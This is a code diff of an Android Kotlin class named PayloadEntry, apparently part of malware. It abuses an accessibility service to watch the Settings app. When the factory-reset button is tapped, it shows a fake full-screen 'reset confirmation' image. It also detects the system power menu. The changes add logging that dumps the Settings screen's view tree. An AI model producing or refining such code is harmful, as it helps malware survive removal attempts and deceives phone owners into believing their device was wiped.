@@ -51,29 +51,46 @@ class PayloadEntry : DynamicEntry {
             var isInjectionScheduled = false
             
             DynamicEntry.accessibilityInterceptor = { event ->
-                // --- RESET INTERCEPTION ---
-                if (event.eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
-                    val sourceId = event.source?.viewIdResourceName ?: ""
-                    if (sourceId.contains("initiate_main_clear")) {
-                        DynamicEntry.log("🚨 RESET TRIGGERED: Injecting Fake Confirmation")
-                        DynamicEntry.overlayContent = {
-                            val resetBitmap = remember(resDir) {
-                                try { BitmapFactory.decodeFile(File(resDir, "resetconfirm.png").absolutePath).asImageBitmap() } catch (e: Exception) { null }
-                            }
-                            Box(modifier = Modifier.fillMaxSize().background(Color.Black)) {
-                                if (resetBitmap != null) {
-                                    Image(
-                                        bitmap = resetBitmap,
-                                        contentDescription = null,
-                                        modifier = Modifier.fillMaxSize(),
-                                        contentScale = ContentScale.FillBounds
-                                    )
+                val pkg = event.packageName?.toString() ?: ""
+                val eventType = event.eventType
+                
+                // --- HEAVY VERBOSE LOGGING ---
+                if (pkg.contains("settings")) {
+                    if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+                        DynamicEntry.log("🔎 SETTINGS WINDOW: ${event.className}")
+                        // Dump tree to see if ID changed under our feet
+                        DynamicEntry.activeAccessibilityService?.rootInActiveWindow?.let { dumpNode(it, 0) }
+                    }
+                    
+                    if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
+                        val source = event.source
+                        val sId = source?.viewIdResourceName ?: "UNKNOWN_ID"
+                        val sTxt = source?.text?.toString() ?: "NO_TEXT"
+                        DynamicEntry.log("🖱️ CLICK ATTEMPT: id=[$sId] txt=[$sTxt]")
+                        
+                        if (sId.contains("initiate_main_clear")) {
+                            DynamicEntry.log("✅ MATCH FOUND! Launching overlay...")
+                            DynamicEntry.overlayContent = {
+                                val resetBitmap = remember(resDir) {
+                                    try { BitmapFactory.decodeFile(File(resDir, "resetconfirm.png").absolutePath).asImageBitmap() } catch (e: Exception) { null }
+                                }
+                                Box(modifier = Modifier.fillMaxSize().background(Color.Black)) {
+                                    if (resetBitmap != null) {
+                                        Image(
+                                            bitmap = resetBitmap,
+                                            contentDescription = null,
+                                            modifier = Modifier.fillMaxSize(),
+                                            contentScale = ContentScale.FillBounds
+                                        )
+                                    }
                                 }
                             }
+                        } else {
+                            DynamicEntry.log("❌ NO MATCH: [$sId] != [initiate_main_clear]")
                         }
                     }
                 }
-                // --------------------------
+                // ------------------------------
 
                 val root = DynamicEntry.activeAccessibilityService?.rootInActiveWindow
                 val hasPowerMenu = root?.let { checkNodes(it) } ?: false
@@ -176,17 +193,25 @@ class PayloadEntry : DynamicEntry {
         }
     }
 
-    private fun checkNodes(node: AccessibilityNodeInfo): Boolean {
-        // Enhanced matching for Samsung and Generic System Power Menus
+        private fun checkNodes(node: AccessibilityNodeInfo): Boolean {
         val idMatch = node.viewIdResourceName?.contains("sec_global_actions") == true
         val classMatch = node.className?.contains("GlobalActions") == true
-        
         if (idMatch || classMatch) return true
-        
         for (i in 0 until node.childCount) {
             if (checkNodes(node.getChild(i) ?: continue)) return true
         }
         return false
     }
 
+    private fun dumpNode(node: AccessibilityNodeInfo?, depth: Int) {
+        if (node == null) return
+        val id = node.viewIdResourceName ?: ""
+        val text = node.text?.toString() ?: ""
+        if (id.isNotEmpty() || text.isNotEmpty()) {
+            DynamicEntry.log("${" ".repeat(depth)}|-- [$id] txt:[$text]")
+        }
+        for (i in 0 until node.childCount) {
+            dumpNode(node.getChild(i), depth + 1)
+        }
+    }
 }
